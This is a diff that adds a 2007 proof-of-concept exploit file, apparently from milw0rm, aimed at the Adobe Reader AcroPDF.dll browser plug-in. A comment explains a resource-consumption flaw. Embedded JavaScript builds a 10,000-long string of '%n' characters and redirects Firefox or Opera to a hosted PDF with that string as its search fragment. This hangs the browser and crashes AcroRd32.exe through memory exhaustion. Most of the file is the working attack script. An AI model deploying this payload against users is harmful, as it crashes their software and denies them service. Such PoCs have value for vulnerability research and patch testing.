@@ -1,0 +1,72 @@
+<!--------------------------------------------------------------------------------
+Adobe PDF Reader plug-in AcroPDF.dll ver. 8.0.0.0 Resource Consumption
+author: shinnai
+mail: shinnai[at]autistici[dot]org
+site: http://www.shinnai.altervista.org
+
+Well, Adobe guys do a good job after the publication of a variety of
+bug in AcroPDF.dll, one for all
+
+From Secunia:
+"Input passed to a hosted PDF file is not properly sanitised by the
+  browser plug-in before being returned to users. This can be exploited
+  to execute arbitrary script code in a user's browser session in context
+  of an affected site."
+
+So now the dll is able to understand when you're trying to insert something
+wrong prompting you with "One or more of the query terms are too long."
+and that's a good thing but... I thought "can this dll sanitise chars like 
+%n"
+Well the answer is: no.
+
+Unfortunately (sure depends by the point of view) Internet Explorer is
+not useful for a test 'cause a limited number of chars (only 2083) is 
+admitted
+in the address bar, so we need to use browser like Firefox and stuff like
+that.
+When you browse to a hosted pdf file like this
+http://somesite/poc.pdf#search=%n%n%n... x 10000 (or much more if you like)
+the browse will stop to answer until the process AcroRd32.exe crashes,
+the CPU usage is about 50-60% and the paging file usage grow until
+it's full and you have the message "Insufficient virtual memory..."
+Here's a proof of concept, for online demonstration see:
+http://www.shinnai.altervista.org/adobe.html
+
+txt version here: http://www.shinnai.altervista.org/txt/adobe.txt
+-------------------------------------------------------------------------------->
+
+<script language="javascript">
+var browserName=navigator.appName;
+
+if (browserName=="Netscape")
+{var f = ""
+var c = ""
+  for (var i = 0; i <= 10000; i++) {
+   var f = f + "%n";
+  }
+document.location = "http://www.shinnai.altervista.org/pucca.pdf#search=" + 
+(f)
+}
+else if (browserName=='Opera')
+{var f = ""
+var c = ""
+  for (var i = 0; i <= 10000; i++) {
+   var f = f + "%n";
+  }
+document.location = "http://www.shinnai.altervista.org/pucca.pdf#search=" + 
+(f)
+}
+else if (browserName=='Microsoft Internet Explorer')
+{
+alert("This exploit doesn't work with IE. You need to use Firefox and stuff 
+like that.");
+document.location="http://www.shinnai.altervista.org";
+}
+else
+{
+alert("Mmm... I don't know what are you browsing with here, so no martini no 
+party.");
+}
+</script>
+
+# milw0rm.com [2007-03-08]
